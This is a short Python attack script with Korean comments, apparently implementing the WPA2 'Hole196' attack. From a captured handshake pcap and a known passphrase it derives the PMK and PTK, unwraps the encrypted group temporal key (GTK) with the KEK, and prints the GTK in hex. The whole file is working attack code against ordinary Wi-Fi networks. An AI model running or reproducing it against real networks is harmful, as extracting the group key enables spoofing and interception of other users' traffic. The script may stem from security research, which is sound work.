from cls_collPcap import collPcap
from def_getPMK import getPMK
from def_getPTK import getPTK
import binascii
from cryptography.hazmat.primitives.keywrap import aes_key_unwrap


def atkHole196(pcapPath:str, pwd:str):
    collCls = collPcap()
    collCls.read(pcapPath, hashcatFlag=False)
    
    pmk = getPMK(collCls.ESSID, pwd)
    ptk = getPTK(pmk, collCls.MAC_AP, collCls.MAC_CLIENT, collCls.NONCE_AP, collCls.NONCE_CLIENT)
    kek = ptk[16:32]
    #kck = ptk[0:16]
    GTK_DECDATA = aes_key_unwrap(kek, collCls.GTK_ENCDATA)
    gtk = b''
    idx = 0
    while (idx <= len(GTK_DECDATA)-1):
        if GTK_DECDATA[idx] != 221:
            # Vendor Specific 태그를 찾을 때까지 반복
            print(GTK_DECDATA[idx])
            idx += int(GTK_DECDATA[idx+1])+2
        else:
            # 해당 태그를 찾으면 GTK 슬라이싱 후 반복 종료
            gtk = GTK_DECDATA[idx+8:idx+24]
            break
    
    print(binascii.hexlify(gtk).decode('ascii'))